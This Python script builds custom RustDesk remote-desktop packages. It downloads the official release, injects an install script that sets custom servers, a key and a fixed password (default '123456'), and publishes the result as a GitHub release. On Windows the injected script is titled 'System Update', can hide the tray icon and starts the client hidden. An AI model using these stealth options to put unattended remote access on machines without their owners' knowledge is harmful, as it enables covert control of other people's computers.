import os
import sys
import zipfile
import shutil
import requests
import uuid

# --- 配置部分 ---
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")

# 前端传来的配置
API_SERVER = os.getenv("API_SERVER", "")
ID_SERVER = os.getenv("ID_SERVER", "")
RELAY_SERVER = os.getenv("RELAY_SERVER", "")
KEY = os.getenv("KEY", "")
CUSTOM_ID = os.getenv("CUSTOM_ID", "").strip()  # 去除首尾空格
PASSWORD = os.getenv("PASSWORD", "123456")
OS_TARGET = os.getenv("OS_TARGET", "windows")
HIDE_TRAY = os.getenv("HIDE_TRAY", "false")

def log(msg):
    print(f"🔨 {msg}")

def get_latest_rustdesk_version():
    """
    获取 RustDesk 最新版本号（修复版：去除 v 前缀以匹配文件名）
    """
    log("正在获取 RustDesk 最新版本...")
    url = "https://api.github.com/repos/rustdesk/rustdesk/releases/latest"
    try:
        headers = {'User-Agent': 'Python-RustDesk-Builder'}
        r = requests.get(url, headers=headers, timeout=15)
        
        if r.status_code != 200:
            log(f"⚠️ GitHub API 请求失败: {r.status_code}，使用备用版本号 1.2.3")
            return "1.2.3" 

        tag_name = r.json()['tag_name']  # 例如 "v1.2.3"
        
        # 关键修复：去掉 'v'，因为实际文件名是 rustdesk-1.2.3-... 而不是 rustdesk-v1.2.3-...
        if tag_name.startswith('v'):
            return tag_name[1:] 
        return tag_name

    except Exception as e:
        print(f"⚠️ 获取版本发生异常: {e}")
        return "1.2.3" # 异常时备用

def download_file(url, dest):
    log(f"正在下载: {url}")
    try:
        response = requests.get(url, stream=True, timeout=60)
        with open(dest, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
        log("下载完成")
    except Exception as e:
        raise Exception(f"下载文件失败: {e}")

def generate_windows_wrapper():
    """生成 Windows 下的 bat 启动脚本 (智能 ID)"""
    # 只有当 CUSTOM_ID 不为空时，才生成设置 ID 的命令
    cmd_set_id = ""
    if CUSTOM_ID:
        cmd_set_id = f"rustdesk.exe --id \"{CUSTOM_ID}\"\n"

    bat_content = f"""@echo off
title System Update
schtasks /Delete /TN "RustDeskUpdate" /F >nul 2>&1
taskkill /F /IM rustdesk.exe >nul 2>&1
taskkill /F /IM rustdesk-service.exe >nul 2>&1

rustdesk.exe --install-service

rustdesk.exe --key "{KEY}"
rustdesk.exe --api-server "{API_SERVER}"
rustdesk.exe --id-server "{ID_SERVER}"
IF NOT "{RELAY_SERVER}"=="" (
    rustdesk.exe --relay-server "{RELAY_SERVER}"
)

{cmd_set_id}

rustdesk.exe --password "{PASSWORD}"

IF "{HIDE_TRAY}"=="true" (
    reg add "HKCU\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
    reg add "HKLM\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
)

net start RustDesk >nul 2>&1
start "" rustdesk.exe --hide
exit
"""
    return bat_content

def generate_linux_wrapper():
    """生成 Linux 下的 sh 启动脚本 (智能 ID)"""
    cmd_set_id = ""
    if CUSTOM_ID:
        cmd_set_id = f"./rustdesk --id \"{CUSTOM_ID}\"\n"

    sh_content = f"""#!/bin/bash
systemctl stop rustdesk > /dev/null 2>&1
./rustdesk --service uninstall > /dev/null 2>&1
./rustdesk --service

./rustdesk --key "{KEY}"
./rustdesk --api-server "{API_SERVER}"
./rustdesk --id-server "{ID_SERVER}"

{cmd_set_id}

./rustdesk --password "{PASSWORD}"
systemctl enable rustdesk
systemctl restart rustdesk

echo "RustDesk Service Started"
"""
    return sh_content

def process_zip(zip_path, output_path):
    log("正在解压并注入配置脚本...")
    temp_dir = zip_path.replace(".zip", "_temp")
    if os.path.exists(temp_dir): shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)

    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(temp_dir)

    if OS_TARGET == "windows":
        wrapper = generate_windows_wrapper()
        with open(os.path.join(temp_dir, "install.bat"), "w", encoding="utf-8") as f:
            f.write(wrapper)
    else:
        wrapper = generate_linux_wrapper()
        with open(os.path.join(temp_dir, "install.sh"), "w", encoding="utf-8") as f:
            f.write(wrapper)

    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, temp_dir)
                z.write(file_path, arcname)
    
    shutil.rmtree(temp_dir)
    log("修改后的压缩包已生成")

def create_github_release(filename):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/releases"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    
    base_ver = get_latest_rustdesk_version()
    # 生成随机 tag 防止冲突
    tag_name = f"v{base_ver}-{uuid.uuid4().hex[:8]}" 
    release_name = f"RustDesk Custom Build ({OS_TARGET})"

    data = {
        "tag_name": tag_name,
        "name": release_name,
        "body": f"Auto generated RustDesk Build\nVersion: {base_ver}\nConfig ID: {CUSTOM_ID if CUSTOM_ID else 'Auto-Generate'}",
        "draft": False,
        "prerelease": False
    }
    
    log(f"正在创建 GitHub Release: {tag_name}")
    res = requests.post(url, headers=headers, json=data)
    
    if not res.ok:
        print(res.text)
        raise Exception(f"创建 Release 失败: {res.status_code}")
    
    upload_url = res.json()["upload_url"].replace("{?name,label}", "")
    log(f"正在上传文件到 GitHub...")
    upload_url_with_name = f"{upload_url}?name={filename}"
    
    with open(filename, 'rb') as f:
        upload_res = requests.post(upload_url_with_name, headers=headers, data=f)
        
    if upload_res.ok:
        print(f"✅ 构建完成！下载地址: {res.json()['html_url']}")
    else:
        raise Exception("上传文件失败")

def main():
    log("🚀 开始构建流程...")
    
    # 1. 获取正确的版本号 (不带 v)
    ver = get_latest_rustdesk_version()
    log(f"📦 目标版本号: {ver}")
    
    # 2. 确定下载 URL 和文件名
    # 注意：RustDesk 官方的下载链接路径里需要带 v (例如 .../download/v1.2.3/...)
    # 但文件名本身不带 v (例如 rustdesk-1.2.3-...)
    
    if OS_TARGET == "windows":
        file_name = f"rustdesk-{ver}-x86_64-pc-windows.zip"
        # 这里的 URL 一定要加上 v
        source_url = f"https://github.com/rustdesk/rustdesk/releases/download/v{ver}/{file_name}"
        output_name = f"RustDesk-Windows-{ver}-AutoID.zip"
    else:
        file_name = f"rustdesk-{ver}-x86_64-unknown-linux-gnu.zip"
        # URL 加上 v
        source_url = f"https://github.com/rustdesk/rustdesk/releases/download/v{ver}/{file_name}"
        output_name = f"RustDesk-Linux-{ver}-AutoID.zip"

    log(f"🔗 下载链接: {source_url}")

    # 3. 下载
    if os.path.exists(file_name):
        os.remove(file_name)
    
    try:
        download_file(source_url, file_name)
    except Exception as e:
        log(f"❌ 下载 {file_name} 失败！")
        log(f"💡 这通常是因为版本 {ver} 尚未发布到官方，或者网络问题。")
        raise

    # 4. 注入配置
    if os.path.exists(output_name):
        os.remove(output_name)
        
    process_zip(file_name, output_name)
    
    # 5. 上传 GitHub
    create_github_release(output_name)

if __name__ == "__main__":
    main()
